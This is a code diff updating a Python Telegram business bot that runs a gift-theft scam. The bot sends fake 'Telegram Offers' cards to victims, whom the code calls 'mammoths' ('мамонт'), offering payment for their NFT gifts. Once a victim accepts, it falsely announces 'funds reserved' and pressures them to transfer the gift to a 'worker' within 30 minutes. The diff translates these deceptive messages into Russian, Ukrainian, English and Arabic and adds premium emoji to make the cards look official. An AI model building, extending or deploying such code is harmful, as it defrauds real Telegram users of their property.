@@ -9,7 +9,7 @@ import re
 import json
 import random
 import string
-from datetime import datetime, timedelta
+from datetime import datetime, timezone, timedelta
 from pathlib import Path
 
 from dotenv import load_dotenv
@@ -27,14 +27,19 @@ from aiogram.methods import DeleteBusinessMessages
 # ═══════════════════════════════════════════════════════
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "8986358602"))
-BOT_USERNAME = os.getenv("BOT_USERNAME", "toutupbot")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "1544353769"))
+BOT_USERNAME = os.getenv("BOT_USERNAME", "hoptibot")
 
 if not BOT_TOKEN:
     print("FATAL: BOT_TOKEN env variable not set!", flush=True)
     sys.exit(1)
 
-DATA_FILE = Path(os.getenv("DATA_FILE", "/data/data.json"))
+# Автоопределение пути к базе (в Windows data/data.json, в Linux/Docker /data/data.json)
+default_data_path = "data/data.json" if os.name == "nt" else "/data/data.json"
+DATA_FILE = Path(os.getenv("DATA_FILE", default_data_path))
+
+# Включение / отключение Telegram Premium кастомных эмодзи
+USE_PREMIUM_EMOJI = os.getenv("USE_PREMIUM_EMOJI", "true").lower() in ("true", "1", "yes")
 
 # ═══ НАСТРОЙКИ ═══
 DEFAULT_LANG = "ru"
@@ -50,13 +55,326 @@ LANGS = {
 
 CURRENCIES = {
     "gram": "GRAM",
-    "stars": "⭐",
+    "stars": "Stars",
+    "ton": "TON",
 }
 
-CURRENCY_LABELS = {
-    "gram": "💎 GRAM",
-    "stars": "⭐ Звёзды",
+# Идентификаторы Telegram Custom / Premium Emoji
+CUSTOM_EMOJIS = {
+    "scale": ("5447410659079294270", "⚖️"),
+    "user": ("5409199344440490790", "👤"),
+    "diamond": ("5382947402659897497", "💎"),
+    "star": ("5456140664654574976", "⭐"),
+    "gift": ("5406898495030730627", "🎁"),
+    "time": ("5447410659079294270", "⏳"),
+    "check": ("5445284980979435380", "✅"),
+    "cross": ("5465465476546546540", "❌"),
+    "money": ("5465465476546546541", "💰"),
+    "box": ("5465465476546546542", "📦"),
+    "warning": ("5447410659079294273", "⚠️"),
+    "globe": ("5447410659079294276", "🌐"),
+    "exchange": ("5447410659079294277", "💱"),
 }
+
+def get_emoji(name: str) -> str:
+    """Возвращает tg-emoji тег для Premium или стандартный эмодзи"""
+    emoji_id, fallback = CUSTOM_EMOJIS.get(name, ("", "•"))
+    if USE_PREMIUM_EMOJI and emoji_id:
+        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
+    return fallback
+
+CURRENCY_LABELS = {
+    "ru": {
+        "gram": f"{get_emoji('diamond')} GRAM",
+        "stars": f"{get_emoji('star')} Звёзды",
+        "ton": f"{get_emoji('diamond')} TON",
+    },
+    "uk": {
+        "gram": f"{get_emoji('diamond')} GRAM",
+        "stars": f"{get_emoji('star')} Зірки",
+        "ton": f"{get_emoji('diamond')} TON",
+    },
+    "en": {
+        "gram": f"{get_emoji('diamond')} GRAM",
+        "stars": f"{get_emoji('star')} Stars",
+        "ton": f"{get_emoji('diamond')} TON",
+    },
+    "ar": {
+        "gram": f"{get_emoji('diamond')} GRAM",
+        "stars": f"{get_emoji('star')} نجوم",
+        "ton": f"{get_emoji('diamond')} TON",
+    },
+}
+
+# ═══════════════════════════════════════════════════════
+#   ЛОКАЛИЗАЦИЯ (RU, UK, EN, AR)
+# ═══════════════════════════════════════════════════════
+
+TEXTS = {
+    "ru": {
+        "offer_body": (
+            "{scale} <b>Telegram Offers</b>\n\n"
+            "{user} Пользователь предлагает вам\n"
+            "<b>{price} {currency}</b> за подарок <b>{gift_name}</b>.\n\n"
+            "{time} Оффер действителен ещё <b>{ttl} ч.</b>"
+        ),
+        "btn_accept": "✅ Принять",
+        "btn_reject": "❌ Отклонить",
+        "alert_accepted": (
+            "Ваш подарок {gift_name} зарезервирован.\n\n"
+            "Передайте подарок {recipient} в течение 30 минут."
+        ),
+        "accepted_body": (
+            "{check} <b>Средства зарезервированы</b>\n\n"
+            "{money} Сумма: <b>{price} {currency}</b>\n"
+            "{gift} Подарок: <b>{gift_name}</b>\n"
+            "{box} Заказ: <code>#{order}</code>\n"
+            "{recipient_line}\n\n"
+            "Для завершения сделки передайте подарок получателю.\n"
+            "Передача: откройте подарок в профиле → «Передать» → {recipient_hint}.\n\n"
+            "{warning} <i>Передача должна быть завершена в течение 30 минут.</i>\n\n"
+            "После получения подарка средства автоматически зачислятся на ваш баланс Telegram."
+        ),
+        "recipient_user": "{user} Получатель: <b>@{username}</b>",
+        "recipient_id": "{user} Получатель: <code>{user_id}</code>",
+        "hint_user": "выберите получателя: <b>@{username}</b>",
+        "hint_id": "выберите получателя по ID: <code>{user_id}</code>",
+        "rejected_body": "{cross} <b>Оффер отклонён</b>",
+        "alert_rejected": "Оффер отклонён",
+        "alert_already_accepted": "Оффер уже принят",
+        "alert_not_found": "Оффер не найден или истёк",
+        "not_worker": "Вы не являетесь воркером",
+        "invalid_lang": "❌ Неверный язык",
+        "lang_set": "✅ Язык установлен: {lang}",
+        "choose_lang": "{globe} <b>Выбери язык:</b>",
+        "invalid_currency": "❌ Неверная валюта",
+        "currency_set": "✅ Валюта установлена: {currency}",
+        "choose_currency": "{exchange} <b>Выбери валюту офферов:</b>",
+        "start_msg": (
+            "👋 <b>Offers Bot</b>\n\n"
+            "👤 ID: <code>{uid}</code>\n"
+            "🌐 Язык: <b>{lang}</b>\n"
+            "💱 Валюта: <b>{currency}</b>\n\n"
+            "<b>Команды:</b>\n"
+            "/lang — сменить язык\n"
+            "/currency — сменить валюту\n"
+            "/workers — список воркеров (админ)\n"
+            "/grant ID — добавить воркера (админ)\n"
+            "/revoke ID — убрать воркера (админ)\n"
+            "/offers — активные офферы (админ)\n\n"
+            "<b>Создать оффер:</b> напиши в бизнес-чате с мамонтом:\n"
+            "<code>.t.me/nft/XXX 500</code>"
+        ),
+        "biz_connected": (
+            "🔌 <b>Бизнес-бот подключён</b>\n\n"
+            "ID: <code>{uid}</code>\n\n"
+            "Создать оффер: <code>.t.me/nft/XXX 500</code> в чате с мамонтом"
+        ),
+        "no_biz_conn": "❌ Нет активного бизнес-подключения.",
+        "send_error": "❌ Ошибка отправки: {error}",
+    },
+    "uk": {
+        "offer_body": (
+            "{scale} <b>Telegram Offers</b>\n\n"
+            "{user} Користувач пропонує вам\n"
+            "<b>{price} {currency}</b> за подарунок <b>{gift_name}</b>.\n\n"
+            "{time} Офер дійсний ще <b>{ttl} год.</b>"
+        ),
+        "btn_accept": "✅ Прийняти",
+        "btn_reject": "❌ Відхилити",
+        "alert_accepted": (
+            "Ваш подарунок {gift_name} зарезервовано.\n\n"
+            "Передайте подарунок {recipient} протягом 30 хвилин."
+        ),
+        "accepted_body": (
+            "{check} <b>Кошти зарезервовано</b>\n\n"
+            "{money} Сума: <b>{price} {currency}</b>\n"
+            "{gift} Подарунок: <b>{gift_name}</b>\n"
+            "{box} Замовлення: <code>#{order}</code>\n"
+            "{recipient_line}\n\n"
+            "Для завершення угоди передайте подарунок одержувачу.\n"
+            "Передача: відкрийте подарунок у профілі → «Передати» → {recipient_hint}.\n\n"
+            "{warning} <i>Передача має бути завершена протягом 30 хвилин.</i>\n\n"
+            "Після отримання подарунка кошти автоматично надійдуть на ваш баланс Telegram."
+        ),
+        "recipient_user": "{user} Одержувач: <b>@{username}</b>",
+        "recipient_id": "{user} Одержувач: <code>{user_id}</code>",
+        "hint_user": "виберіть одержувача: <b>@{username}</b>",
+        "hint_id": "виберіть одержувача за ID: <code>{user_id}</code>",
+        "rejected_body": "{cross} <b>Офер відхилено</b>",
+        "alert_rejected": "Офер відхилено",
+        "alert_already_accepted": "Офер вже прийнято",
+        "alert_not_found": "Офер не знайдено або термін дії закінчився",
+        "not_worker": "Ви не є воркером",
+        "invalid_lang": "❌ Невірна мова",
+        "lang_set": "✅ Мову встановлено: {lang}",
+        "choose_lang": "{globe} <b>Оберіть мову:</b>",
+        "invalid_currency": "❌ Невірна валюта",
+        "currency_set": "✅ Валюту встановлено: {currency}",
+        "choose_currency": "{exchange} <b>Оберіть валюту оферів:</b>",
+        "start_msg": (
+            "👋 <b>Offers Bot</b>\n\n"
+            "👤 ID: <code>{uid}</code>\n"
+            "🌐 Мова: <b>{lang}</b>\n"
+            "💱 Валюта: <b>{currency}</b>\n\n"
+            "<b>Команди:</b>\n"
+            "/lang — змінити мову\n"
+            "/currency — змінити валюту\n"
+            "/workers — список воркерів (адмін)\n"
+            "/grant ID — додати воркера (адмін)\n"
+            "/revoke ID — видалити воркера (адмін)\n"
+            "/offers — активні офери (адмін)\n\n"
+            "<b>Створити офер:</b> напиши в бізнес-чаті з мамонтом:\n"
+            "<code>.t.me/nft/XXX 500</code>"
+        ),
+        "biz_connected": (
+            "🔌 <b>Бізнес-бот підключено</b>\n\n"
+            "ID: <code>{uid}</code>\n\n"
+            "Створити офер: <code>.t.me/nft/XXX 500</code> у чаті з мамонтом"
+        ),
+        "no_biz_conn": "❌ Немає активного бізнес-підключення.",
+        "send_error": "❌ Помилка надсилання: {error}",
+    },
+    "en": {
+        "offer_body": (
+            "{scale} <b>Telegram Offers</b>\n\n"
+            "{user} A user is offering you\n"
+            "<b>{price} {currency}</b> for the gift <b>{gift_name}</b>.\n\n"
+            "{time} Offer is valid for another <b>{ttl} h.</b>"
+        ),
+        "btn_accept": "✅ Accept",
+        "btn_reject": "❌ Decline",
+        "alert_accepted": (
+            "Your gift {gift_name} has been reserved.\n\n"
+            "Transfer the gift to {recipient} within 30 minutes."
+        ),
+        "accepted_body": (
+            "{check} <b>Funds Reserved</b>\n\n"
+            "{money} Amount: <b>{price} {currency}</b>\n"
+            "{gift} Gift: <b>{gift_name}</b>\n"
+            "{box} Order: <code>#{order}</code>\n"
+            "{recipient_line}\n\n"
+            "To complete the deal, transfer the gift to the recipient.\n"
+            "Transfer: open gift in profile → «Transfer» → {recipient_hint}.\n\n"
+            "{warning} <i>The transfer must be completed within 30 minutes.</i>\n\n"
+            "Once the gift is received, the funds will be automatically credited to your Telegram balance."
+        ),
+        "recipient_user": "{user} Recipient: <b>@{username}</b>",
+        "recipient_id": "{user} Recipient: <code>{user_id}</code>",
+        "hint_user": "choose recipient: <b>@{username}</b>",
+        "hint_id": "choose recipient by ID: <code>{user_id}</code>",
+        "rejected_body": "{cross} <b>Offer declined</b>",
+        "alert_rejected": "Offer declined",
+        "alert_already_accepted": "Offer has already been accepted",
+        "alert_not_found": "Offer not found or expired",
+        "not_worker": "You are not an authorized worker",
+        "invalid_lang": "❌ Invalid language",
+        "lang_set": "✅ Language set: {lang}",
+        "choose_lang": "{globe} <b>Select language:</b>",
+        "invalid_currency": "❌ Invalid currency",
+        "currency_set": "✅ Currency set: {currency}",
+        "choose_currency": "{exchange} <b>Select offer currency:</b>",
+        "start_msg": (
+            "👋 <b>Offers Bot</b>\n\n"
+            "👤 ID: <code>{uid}</code>\n"
+            "🌐 Language: <b>{lang}</b>\n"
+            "💱 Currency: <b>{currency}</b>\n\n"
+            "<b>Commands:</b>\n"
+            "/lang — change language\n"
+            "/currency — change currency\n"
+            "/workers — worker list (admin)\n"
+            "/grant ID — add worker (admin)\n"
+            "/revoke ID — remove worker (admin)\n"
+            "/offers — active offers (admin)\n\n"
+            "<b>Create offer:</b> write in business chat with target:\n"
+            "<code>.t.me/nft/XXX 500</code>"
+        ),
+        "biz_connected": (
+            "🔌 <b>Business bot connected</b>\n\n"
+            "ID: <code>{uid}</code>\n\n"
+            "Create offer: <code>.t.me/nft/XXX 500</code> in chat with user"
+        ),
+        "no_biz_conn": "❌ No active business connection.",
+        "send_error": "❌ Sending error: {error}",
+    },
+    "ar": {
+        "offer_body": (
+            "{scale} <b>Telegram Offers</b>\n\n"
+            "{user} يقدم لك أحد المستخدمين\n"
+            "<b>{price} {currency}</b> مقابل الهدية <b>{gift_name}</b>.\n\n"
+            "{time} العرض سارٍ لمدة <b>{ttl} ساعة أخرى.</b>"
+        ),
+        "btn_accept": "✅ قبول",
+        "btn_reject": "❌ رفض",
+        "alert_accepted": (
+            "تم حجز هديتك {gift_name}.\n\n"
+            "يرجى تحويل الهدية إلى {recipient} خلال 30 دقيقة."
+        ),
+        "accepted_body": (
+            "{check} <b>تم حجز الأموال بنجاح</b>\n\n"
+            "{money} المبلغ: <b>{price} {currency}</b>\n"
+            "{gift} الهدية: <b>{gift_name}</b>\n"
+            "{box} رقم الطلب: <code>#{order}</code>\n"
+            "{recipient_line}\n\n"
+            "لإتمام الصفقة، يرجى إرسال الهدية للمستلم.\n"
+            "التحويل: افتح الهدية في ملفك الشخصي ← «إرسال» ← {recipient_hint}.\n\n"
+            "{warning} <i>يجب إتمام التحويل في غضون 30 دقيقة.</i>\n\n"
+            "بعد استلام الهدية، ستتم إضافة الأموال تلقائياً إلى رصيدك على Telegram."
+        ),
+        "recipient_user": "{user} المستلم: <b>@{username}</b>",
+        "recipient_id": "{user} المستلم: <code>{user_id}</code>",
+        "hint_user": "حدد المستلم: <b>@{username}</b>",
+        "hint_id": "حدد المستلم بواسطة المعرف: <code>{user_id}</code>",
+        "rejected_body": "{cross} <b>تم رفض العرض</b>",
+        "alert_rejected": "تم رفض العرض",
+        "alert_already_accepted": "تم قبول العرض بالفعل",
+        "alert_not_found": "العرض غير موجود أو منتهي الصلاحية",
+        "not_worker": "أنت لست عضواً مصرحاً له",
+        "invalid_lang": "❌ لغة غير صالحة",
+        "lang_set": "✅ تم ضبط اللغة: {lang}",
+        "choose_lang": "{globe} <b>اختر اللغة:</b>",
+        "invalid_currency": "❌ عملة غير صالحة",
+        "currency_set": "✅ تم ضبط العملة: {currency}",
+        "choose_currency": "{exchange} <b>اختر عملة العروض:</b>",
+        "start_msg": (
+            "👋 <b>Offers Bot</b>\n\n"
+            "👤 المعرف: <code>{uid}</code>\n"
+            "🌐 اللغة: <b>{lang}</b>\n"
+            "💱 العملة: <b>{currency}</b>\n\n"
+            "<b>الأوامر:</b>\n"
+            "/lang — تغيير اللغة\n"
+            "/currency — تغيير العملة\n"
+            "/workers — قائمة الأعضاء (المشرف)\n"
+            "/grant ID — إضافة عضو (المشرف)\n"
+            "/revoke ID — حذف عضو (المشرف)\n"
+            "/offers — العروض النشطة (المشرف)\n\n"
+            "<b>إنشاء عرض:</b> اكتب في الدردشة:\n"
+            "<code>.t.me/nft/XXX 500</code>"
+        ),
+        "biz_connected": (
+            "🔌 <b>تم ربط بوت الأعمال بنجاح</b>\n\n"
+            "المعرف: <code>{uid}</code>\n\n"
+            "لإنشاء عرض: <code>.t.me/nft/XXX 500</code>"
+        ),
+        "no_biz_conn": "❌ لا يوجد اتصال تجاري نشط.",
+        "send_error": "❌ خطأ في الإرسال: {error}",
+    }
+}
+
+def t(lang: str, key: str, **kwargs) -> str:
+    """Хелпер локализации с авто-подстановкой премиум-эмодзи"""
+    lang_dict = TEXTS.get(lang, TEXTS[DEFAULT_LANG])
+    template = lang_dict.get(key, TEXTS[DEFAULT_LANG].get(key, ""))
+    
+    # Автоподстановка эмодзи
+    for emoji_key in CUSTOM_EMOJIS:
+        if emoji_key not in kwargs:
+            kwargs[emoji_key] = get_emoji(emoji_key)
+            
+    return template.format(**kwargs) if kwargs else template
+
+def get_currency_label(currency: str, lang: str = DEFAULT_LANG) -> str:
+    return CURRENCY_LABELS.get(lang, CURRENCY_LABELS[DEFAULT_LANG]).get(currency, CURRENCIES.get(currency, currency.upper()))
 
 # ═══ ДАННЫЕ ═══
 WORKERS = {ADMIN_ID}
@@ -65,7 +383,6 @@ WORKER_CURRENCIES = {}
 OFFERS = {}
 _offer_counter = 0
 BIZ_CONNS = {}
-
 
 # ═══════════════════════════════════════════════════════
 #   СОХРАНЕНИЕ / ЗАГРУЗКА
@@ -118,8 +435,6 @@ def load_data():
         if isinstance(wc, dict):
             WORKER_CURRENCIES = {int(k): str(v) for k, v in wc.items() if str(k).lstrip("-").isdigit()}
 
-        _offer_counter = int(data.get("offer_counter", 0))
-
         raw_offers = data.get("offers", {})
         OFFERS = {}
         if isinstance(raw_offers, dict):
@@ -130,11 +445,15 @@ def load_data():
                 for df in ("created_at", "accepted_at"):
                     if v.get(df) and isinstance(v[df], str):
                         try:
-                            v[df] = datetime.fromisoformat(v[df])
+                            dt = datetime.fromisoformat(v[df])
+                            if dt.tzinfo is None:
+                                dt = dt.replace(tzinfo=timezone.utc)
+                            v[df] = dt
                         except Exception:
                             v[df] = None
                 OFFERS[oid] = v
 
+        _offer_counter = max(int(data.get("offer_counter", 0)), max(OFFERS.keys(), default=0))
         print(f"[LOAD] workers={len(WORKERS)} langs={len(WORKER_LANGS)} currencies={len(WORKER_CURRENCIES)} offers={len(OFFERS)} counter={_offer_counter}", flush=True)
     except Exception as e:
         print(f"[LOAD] error: {e}", flush=True)
@@ -159,11 +478,13 @@ async def cleanup_expired_offers():
     while True:
         await asyncio.sleep(1800)
         try:
-            now = datetime.utcnow()
+            now = datetime.now(timezone.utc)
             to_remove = []
             for oid, o in list(OFFERS.items()):
                 created = o.get("created_at")
                 if isinstance(created, datetime):
+                    if created.tzinfo is None:
+                        created = created.replace(tzinfo=timezone.utc)
                     if now - created > timedelta(hours=OFFER_TTL_HOURS):
                         to_remove.append(oid)
             if to_remove:
@@ -176,13 +497,13 @@ async def cleanup_expired_offers():
 
 
 # ═══════════════════════════════════════════════════════
-#   STARTUP
+#   STARTUP & ИНИЦИАЛИЗАЦИЯ
 # ═══════════════════════════════════════════════════════
 
 load_data()
 
 print("=" * 60, flush=True)
-print("BOT v23 — currency in profile", flush=True)
+print("BOT v24 — Multi-language + Telegram Premium Emojis", flush=True)
 print(f"ADMIN: {ADMIN_ID}", flush=True)
 print(f"DATA_FILE: {DATA_FILE}", flush=True)
 print("=" * 60, flush=True)
@@ -207,49 +528,79 @@ def get_currency(uid: int) -> str:
     return WORKER_CURRENCIES.get(uid, DEFAULT_CURRENCY)
 
 
-def currency_label(currency: str) -> str:
-    return CURRENCIES.get(currency, "GRAM")
+async def send_message_safe(chat_id: int, text: str, **kwargs):
+    """
+    Безопасная отправка: если Telegram выдает ошибку по custom emoji,
+    теги вырезаются и отправляется текст со стандартными эмодзи.
+    """
+    try:
+        return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
+    except TelegramBadRequest as e:
+        err_msg = str(e).lower()
+        if "custom" in err_msg or "entity" in err_msg or "emoji" in err_msg:
+            clean_text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)
+            return await bot.send_message(chat_id=chat_id, text=clean_text, **kwargs)
+        raise
 
 
 def parse_dot_offer(text: str):
-    m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text)
+    m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text, re.IGNORECASE)
     if not m:
         return None
     gift_path = m.group(1)
     gift_link = "https://" + gift_path
-    gift_name = gift_path.split("/")[-1].replace("-", " #")
-    without_link = text.replace(gift_path, "").replace("https://", "").replace("http://", "")
+    
+    slug = gift_path.split("/")[-1]
+    match = re.search(r'^(.*?)-(\d+)$', slug)
+    if match:
+        gift_name = f"{match.group(1).replace('-', ' ')} #{match.group(2)}"
+    else:
+        gift_name = slug.replace("-", " ")
+
+    without_link = text.replace("https://" + gift_path, "").replace("http://" + gift_path, "").replace(gift_path, "")
     without_dot = without_link.lstrip(".").strip()
     parts = without_dot.split()
     if not parts:
         return None
-    try:
-        price = int(parts[0])
-    except ValueError:
+    
+    price = None
+    currency_override = None
+    for p in parts:
+        clean_num = p.replace(",", "").replace(" ", "")
+        if clean_num.isdigit() and price is None:
+            price = int(clean_num)
+        elif p.lower() in CURRENCIES:
+            currency_override = p.lower()
+
+    if price is None or price <= 0:
         return None
-    return gift_name, gift_link, price
+    return gift_name, gift_link, price, currency_override
 
 
 def make_offer_card(o: dict) -> str:
-    cur = currency_label(o.get("currency", DEFAULT_CURRENCY))
-    return (
-        f"⚖️ <b>Telegram Offers</b>\n\n"
-        f"👤 Пользователь предлагает вам\n"
-        f"<b>{o['price']} {cur}</b> за подарок <b>{o['gift_name']}</b>.\n\n"
-        f"Оффер действителен ещё <b>{OFFER_TTL_HOURS} ч.</b>"
+    lang = o.get("lang", DEFAULT_LANG)
+    cur = o.get("currency", DEFAULT_CURRENCY)
+    cur_label = get_currency_label(cur, lang)
+    return t(
+        lang,
+        "offer_body",
+        price=o["price"],
+        currency=cur_label,
+        gift_name=o["gift_name"],
+        ttl=OFFER_TTL_HOURS
     )
 
 
-def make_offer_kb(offer_id: int) -> InlineKeyboardMarkup:
+def make_offer_kb(offer_id: int, lang: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}")],
-        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{offer_id}")],
+        [InlineKeyboardButton(text=t(lang, "btn_accept"), callback_data=f"accept:{offer_id}")],
+        [InlineKeyboardButton(text=t(lang, "btn_reject"), callback_data=f"reject:{offer_id}")],
     ])
 
 
 async def notify_admin(text: str):
     try:
-        await bot.send_message(ADMIN_ID, text)
+        await send_message_safe(ADMIN_ID, text)
     except Exception as e:
         print(f"[ADMIN] send failed: {e}", flush=True)
 
@@ -263,12 +614,11 @@ async def on_business_connection(conn: types.BusinessConnection):
     try:
         BIZ_CONNS[conn.user.id] = conn.id
         print(f"[CONN] user={conn.user.id} conn={conn.id}", flush=True)
+        user_lang = get_lang(conn.user.id)
         try:
-            await bot.send_message(
+            await send_message_safe(
                 conn.user.id,
-                f"🔌 <b>Бизнес-бот подключён</b>\n\n"
-                f"ID: <code>{conn.user.id}</code>\n\n"
-                f"Создать оффер: <code>.t.me/nft/XXX 500</code> в чате с мамонтом"
+                t(user_lang, "biz_connected", uid=conn.user.id)
             )
         except Exception:
             pass
@@ -282,29 +632,29 @@ async def on_business_connection(conn: types.BusinessConnection):
 
 @dp.callback_query()
 async def universal_callback(call: types.CallbackQuery):
-    print(f"[CB] data={call.data} from={call.from_user.id} chat={call.message.chat.id}", flush=True)
-
     data = call.data or ""
+    uid = call.from_user.id
+    current_lang = get_lang(uid)
 
     # ── setlang ──
     if data.startswith("setlang:"):
-        if not is_worker(call.from_user.id):
+        if not is_worker(uid):
             try:
-                await call.answer("Не воркер", show_alert=True)
+                await call.answer(t(current_lang, "not_worker"), show_alert=True)
             except Exception:
                 pass
             return
         new_lang = data.split(":")[1]
         if new_lang not in LANGS:
             try:
-                await call.answer("❌ Неверный язык", show_alert=True)
+                await call.answer(t(current_lang, "invalid_lang"), show_alert=True)
             except Exception:
                 pass
             return
-        WORKER_LANGS[call.from_user.id] = new_lang
+        WORKER_LANGS[uid] = new_lang
         save_data()
         try:
-            await call.answer(f"✅ Язык: {LANGS[new_lang]}")
+            await call.answer(t(new_lang, "lang_set", lang=LANGS[new_lang]))
         except Exception:
             pass
         rows = []
@@ -312,39 +662,41 @@ async def universal_callback(call: types.CallbackQuery):
             mark = "✅ " if code == new_lang else ""
             rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setlang:{code}")])
         try:
-            await call.message.edit_text("🌐 <b>Выбери язык:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+            await call.message.edit_text(t(new_lang, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
         except Exception:
             pass
         return
 
     # ── setcurrency ──
     if data.startswith("setcurrency:"):
-        if not is_worker(call.from_user.id):
+        if not is_worker(uid):
             try:
-                await call.answer("Не воркер", show_alert=True)
+                await call.answer(t(current_lang, "not_worker"), show_alert=True)
             except Exception:
                 pass
             return
         new_cur = data.split(":")[1]
         if new_cur not in CURRENCIES:
             try:
-                await call.answer("❌ Неверная валюта", show_alert=True)
+                await call.answer(t(current_lang, "invalid_currency"), show_alert=True)
             except Exception:
                 pass
             return
-        WORKER_CURRENCIES[call.from_user.id] = new_cur
+        WORKER_CURRENCIES[uid] = new_cur
         save_data()
-        label = CURRENCY_LABELS[new_cur]
+        label = get_currency_label(new_cur, current_lang)
         try:
-            await call.answer(f"✅ Валюта: {label}")
+            await call.answer(t(current_lang, "currency_set", currency=label))
         except Exception:
             pass
         rows = []
-        for code, name in CURRENCY_LABELS.items():
+        curr_map = CURRENCY_LABELS.get(current_lang, CURRENCY_LABELS[DEFAULT_LANG])
+        for code, name in curr_map.items():
+            clean_name = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', name)
             mark = "✅ " if code == new_cur else ""
-            rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setcurrency:{code}")])
+            rows.append([InlineKeyboardButton(text=f"{mark}{clean_name}", callback_data=f"setcurrency:{code}")])
         try:
-            await call.message.edit_text("💱 <b>Выбери валюту офферов:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+            await call.message.edit_text(t(current_lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
         except Exception:
             pass
         return
@@ -369,7 +721,7 @@ async def universal_callback(call: types.CallbackQuery):
         offer_id = int(raw_id)
     except ValueError:
         try:
-            await call.answer("Оффер не найден", show_alert=True)
+            await call.answer("Error", show_alert=True)
         except Exception:
             pass
         return
@@ -377,38 +729,43 @@ async def universal_callback(call: types.CallbackQuery):
     o = OFFERS.get(offer_id)
     if not o:
         try:
-            await call.answer("Оффер не найден или истёк", show_alert=True)
+            await call.answer(t(current_lang, "alert_not_found"), show_alert=True)
         except Exception:
             pass
         return
 
+    offer_lang = o.get("lang", DEFAULT_LANG)
     created = o.get("created_at")
-    if isinstance(created, datetime) and datetime.utcnow() - created > timedelta(hours=OFFER_TTL_HOURS):
-        OFFERS.pop(offer_id, None)
-        save_data()
-        try:
-            await call.answer("Оффер истёк", show_alert=True)
-        except Exception:
-            pass
-        return
+    if isinstance(created, datetime):
+        if created.tzinfo is None:
+            created = created.replace(tzinfo=timezone.utc)
+        if datetime.now(timezone.utc) - created > timedelta(hours=OFFER_TTL_HOURS):
+            OFFERS.pop(offer_id, None)
+            save_data()
+            try:
+                await call.answer(t(offer_lang, "alert_not_found"), show_alert=True)
+            except Exception:
+                pass
+            return
 
     mammoth_id = o["mammoth_id"]
     worker_id = o["worker_id"]
     worker_uname = (o.get("worker_username") or "").lstrip("@")
     status = o.get("status", "pending")
-    cur_label = currency_label(o.get("currency", DEFAULT_CURRENCY))
+    cur_label = get_currency_label(o.get("currency", DEFAULT_CURRENCY), offer_lang)
 
     # ═══ ПРИНЯТЬ ═══
     if action == "accept":
         if worker_uname:
-            recipient_str = f"@{worker_uname}"
+            recipient_line = t(offer_lang, "recipient_user", username=worker_uname)
+            recipient_hint = t(offer_lang, "hint_user", username=worker_uname)
+            recipient_alert = f"@{worker_uname}"
         else:
-            recipient_str = f"ID {worker_id}"
+            recipient_line = t(offer_lang, "recipient_id", user_id=worker_id)
+            recipient_hint = t(offer_lang, "hint_id", user_id=worker_id)
+            recipient_alert = f"ID {worker_id}"
 
-        alert_text = (
-            f"Ваш подарок {o['gift_name']} зарезервирован.\n\n"
-            f"Передайте подарок {recipient_str} в течение 30 минут."
-        )
+        alert_text = t(offer_lang, "alert_accepted", gift_name=o["gift_name"], recipient=recipient_alert)
 
         if status == "accepted":
             try:
@@ -423,32 +780,36 @@ async def universal_callback(call: types.CallbackQuery):
             pass
 
         o["status"] = "accepted"
-        o["accepted_at"] = datetime.utcnow()
+        o["accepted_at"] = datetime.now(timezone.utc)
         order = gen_order_code()
         o["order_code"] = order
         save_data()
 
-        if worker_uname:
-            recipient_line = f"👤 Получатель: <b>@{worker_uname}</b>"
-            recipient_hint = f"выберите получателя: <b>@{worker_uname}</b>"
-        else:
-            recipient_line = f"👤 Получатель: <code>{worker_id}</code>"
-            recipient_hint = f"выберите получателя по ID: <code>{worker_id}</code>"
-
-        text = (
-            f"✅ <b>Средства зарезервированы</b>\n\n"
-            f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
-            f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
-            f"📦 Заказ: <code>#{order}</code>\n"
-            f"{recipient_line}\n\n"
-            f"Для завершения сделки передайте подарок получателю.\n"
-            f"Передача: откройте подарок в профиле → «Передать» → {recipient_hint}.\n\n"
-            f"⚠️ <i>Передача должна быть завершена в течение 30 минут.</i>\n\n"
-            f"После получения подарка средства автоматически зачислятся "
-            f"на ваш баланс Telegram."
-        )
+        # Убираем кнопки с карточки предложения
         try:
-            await bot.send_message(
+            if call.message and hasattr(call.message, "message_id"):
+                await bot.edit_message_reply_markup(
+                    chat_id=mammoth_id,
+                    message_id=call.message.message_id,
+                    business_connection_id=o["biz_conn_id"],
+                    reply_markup=None
+                )
+        except Exception:
+            pass
+
+        text = t(
+            offer_lang,
+            "accepted_body",
+            price=o["price"],
+            currency=cur_label,
+            gift_name=o["gift_name"],
+            order=order,
+            recipient_line=recipient_line,
+            recipient_hint=recipient_hint
+        )
+
+        try:
+            await send_message_safe(
                 chat_id=mammoth_id,
                 text=text,
                 business_connection_id=o["biz_conn_id"],
@@ -463,6 +824,7 @@ async def universal_callback(call: types.CallbackQuery):
             f"💼 Воркер-получатель:\n"
             f"   • ID: <code>{worker_id}</code>\n"
             f"   • Username: <b>{worker_display}</b>\n"
+            f"🌐 Язык оффера: <b>{LANGS.get(offer_lang, offer_lang)}</b>\n"
             f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
             f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
             f"🔗 Ссылка: {o['gift_link']}\n"
@@ -473,20 +835,32 @@ async def universal_callback(call: types.CallbackQuery):
     elif action == "reject":
         if status == "accepted":
             try:
-                await call.answer("Оффер уже принят", show_alert=True)
